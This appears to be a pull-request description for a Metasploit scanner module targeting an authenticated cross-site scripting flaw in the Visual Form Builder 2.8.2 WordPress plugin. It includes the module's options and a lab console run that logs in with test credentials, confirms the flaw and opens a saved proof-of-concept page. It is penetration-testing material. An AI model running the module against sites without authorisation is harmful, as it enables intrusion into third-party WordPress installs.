#### Add Wordpress Plugin Visual Form Builder XSS Vulnerability.

  Application: Wordpress Plugin 'Visual Form Builder' 2.8.2
  Homepage: https://wordpress.org/plugins/visual-form-builder/
  Source Code: https://downloads.wordpress.org/plugin/visual-form-builder.2.8.2.zip
  References: https://wpvulndb.com/vulnerabilities/7991
  Active Install: +100.000

#### Vulnerable packages*
        
  2.8.2
  
#### Usage:

##### Linux (Ubuntu 14.04.2 LTS):
```
msf > use auxiliary/scanner/http/wp_visual_form_builder_xss_scanner 
msf auxiliary(wp_visual_form_builder_xss_scanner) > info

       Name: WordPress Visual Form Builder Plugin XSS Scanner
     Module: auxiliary/scanner/http/wp_visual_form_builder_xss_scanner
    License: Metasploit Framework License (BSD)
       Rank: Normal
  Disclosed: 2015-05-15

Provided by:
  Tim Coen
  Roberto Soares Espreto <robertoespreto@gmail.com>

Basic options:
  Name         Current Setting  Required  Description
  ----         ---------------  --------  -----------
  Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                        yes       The target address range or CIDR identifier
  RPORT        80               yes       The target port
  TARGETURI    /                yes       The base path to the wordpress application
  THREADS      1                yes       The number of concurrent threads
  VHOST                         no        HTTP server virtual host
  WP_PASSWORD                   yes       Valid password for the provided username
  WP_USER                       yes       A valid username

Description:
  This module attempts to exploit a authenticated Cross-Site Scripting 
  in Visual Form Builder Plugin for Wordpress, version 2.8.2 and 
  likely prior in order if the instance is vulnerable.

References:
  https://wpvulndb.com/vulnerabilities/7991
  http://software-talk.org/blog/2015/05/sql-injection-reflected-xss-visual-form-builder-wordpress-plugin/

msf auxiliary(wp_visual_form_builder_xss_scanner) > show options 

Module options (auxiliary/scanner/http/wp_visual_form_builder_xss_scanner):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                        yes       The target address range or CIDR identifier
   RPORT        80               yes       The target port
   TARGETURI    /                yes       The base path to the wordpress application
   THREADS      1                yes       The number of concurrent threads
   VHOST                         no        HTTP server virtual host
   WP_PASSWORD                   yes       Valid password for the provided username
   WP_USER                       yes       A valid username

msf auxiliary(wp_visual_form_builder_xss_scanner) > set RHOSTS 192.168.1.38
RHOSTS => 192.168.1.38
msf auxiliary(wp_visual_form_builder_xss_scanner) > set WP_USER espreto
WP_USER => espreto
msf auxiliary(wp_visual_form_builder_xss_scanner) > set WP_PASSWORD dvd43145
WP_PASSWORD => dvd43145
msf auxiliary(wp_visual_form_builder_xss_scanner) > run

[*] 192.168.1.38:80 - Trying to login as espreto
[+] 192.168.1.38:80 - Login successful
[+] 192.168.1.38:80 - Vulnerable to Cross-Site Scripting the "Visual Form Builder 2.8.2" plugin for Wordpress
[+] Save in: /home/espreto/.msf4/local/43225550.html
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(wp_visual_form_builder_xss_scanner) > firefox /home/espreto/.msf4/local/43225550.html
[*] exec: firefox /home/espreto/.msf4/local/43225550.html

```
This will open the browser:

